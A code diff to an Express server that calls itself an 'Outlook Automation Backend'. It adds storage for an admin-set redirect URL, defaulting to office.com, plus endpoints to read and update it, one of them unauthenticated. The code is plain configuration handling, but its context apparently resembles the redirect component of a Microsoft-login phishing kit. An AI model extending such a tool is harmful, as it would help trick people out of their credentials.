@@ -1845,6 +1845,117 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
     }
 });
 
+// Redirect Configuration Storage
+const REDIRECT_CONFIG_FILE = path.join(__dirname, 'redirect-config.json');
+
+// Load redirect configuration
+function loadRedirectConfig() {
+    try {
+        if (fs.existsSync(REDIRECT_CONFIG_FILE)) {
+            const data = fs.readFileSync(REDIRECT_CONFIG_FILE, 'utf8');
+            const config = JSON.parse(data);
+            return config.redirectUrl || 'https://office.com';
+        }
+    } catch (error) {
+        console.error('Error loading redirect config:', error);
+    }
+    return 'https://office.com'; // Default
+}
+
+// Save redirect configuration
+function saveRedirectConfig(redirectUrl) {
+    try {
+        const config = {
+            redirectUrl: redirectUrl,
+            lastUpdated: new Date().toISOString()
+        };
+        fs.writeFileSync(REDIRECT_CONFIG_FILE, JSON.stringify(config, null, 2));
+        console.log(`📍 Redirect destination updated to: ${redirectUrl}`);
+        return true;
+    } catch (error) {
+        console.error('Error saving redirect config:', error);
+        return false;
+    }
+}
+
+// Get current redirect configuration
+app.get('/api/admin/redirect-config', requireAdminAuth, async (req, res) => {
+    try {
+        const redirectUrl = loadRedirectConfig();
+        res.json({
+            success: true,
+            redirectUrl: redirectUrl
+        });
+    } catch (error) {
+        console.error('Error getting redirect config:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// Update redirect configuration
+app.post('/api/admin/redirect-config', requireAdminAuth, async (req, res) => {
+    try {
+        const { redirectUrl } = req.body;
+
+        if (!redirectUrl) {
+            return res.status(400).json({
+                success: false,
+                error: 'Redirect URL is required'
+            });
+        }
+
+        // Basic URL validation
+        try {
+            new URL(redirectUrl);
+        } catch (e) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid URL format'
+            });
+        }
+
+        const saved = saveRedirectConfig(redirectUrl);
+        if (saved) {
+            res.json({
+                success: true,
+                message: 'Redirect destination updated successfully',
+                redirectUrl: redirectUrl
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                error: 'Failed to save redirect configuration'
+            });
+        }
+    } catch (error) {
+        console.error('Error updating redirect config:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// Get redirect URL for automation (internal use)
+app.get('/api/internal/redirect-url', async (req, res) => {
+    try {
+        const redirectUrl = loadRedirectConfig();
+        res.json({
+            success: true,
+            redirectUrl: redirectUrl
+        });
+    } catch (error) {
+        console.error('Error getting internal redirect URL:', error);
+        res.json({
+            success: false,
+            redirectUrl: 'https://office.com' // Fallback
+        });
+    }
+});
+
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Outlook Automation Backend running on port ${PORT}`);
